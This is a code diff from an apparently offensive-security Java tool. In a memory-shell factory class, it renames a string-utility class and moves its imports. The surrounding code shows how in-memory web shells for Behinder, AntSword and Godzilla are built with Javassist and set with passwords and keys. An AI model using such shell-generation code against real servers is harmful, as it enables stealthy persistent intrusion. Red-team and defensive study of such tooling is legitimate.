@@ -1,7 +1,7 @@
 package com.potato.potatotool.content.redTeam.memshell.factory;
 
-import com.potato.potatotool.utils.GzipUtils;
-import com.potato.potatotool.utils.strUtils;
+import com.potato.potatotool.utils.data.GzipUtils;
+import com.potato.potatotool.utils.data.StrUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -36,7 +36,7 @@ public class MemoryShellFactory {
         // 设置内存对象的字节数组、字节长度以及gzip后的Base64字符串
         memoryObj.setShellBytes(bytes);
         memoryObj.setShellBytesLength(bytes.length);
-        memoryObj.setShellGzipBase64String(strUtils.base64Encode(GzipUtils.GzipGetCompressedData(bytes)));
+        memoryObj.setShellGzipBase64String(StrUtils.base64Encode(GzipUtils.GzipGetCompressedData(bytes)));
 
         return bytes;
     }
@@ -61,13 +61,13 @@ public class MemoryShellFactory {
             // 根据工具类型设置不同的字段
             switch (toolType) {
                 case MemoryShellConstants.TOOL_BEHINDER:
-                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", strUtils.md5(memoryObj.getPass()).substring(0, 16));
+                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", StrUtils.md5(memoryObj.getPass()).substring(0, 16));
                     break;
                 case MemoryShellConstants.TOOL_ANTSWORD:
                 case MemoryShellConstants.TOOL_GODZILLA:
                     JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", memoryObj.getPass());
                     if (toolType.equals(MemoryShellConstants.TOOL_GODZILLA)) {
-                        JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "key", strUtils.md5(memoryObj.getKey()).substring(0, 16));
+                        JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "key", StrUtils.md5(memoryObj.getKey()).substring(0, 16));
                     }
                     break;
             }
@@ -104,7 +104,7 @@ public class MemoryShellFactory {
             ctClass.detach();
         }
 
-        byte[] bytes = strUtils.readFile(memoryObj.getClassFilePath());
+        byte[] bytes = StrUtils.readFile(memoryObj.getClassFilePath());
 
         return bytes;
     }
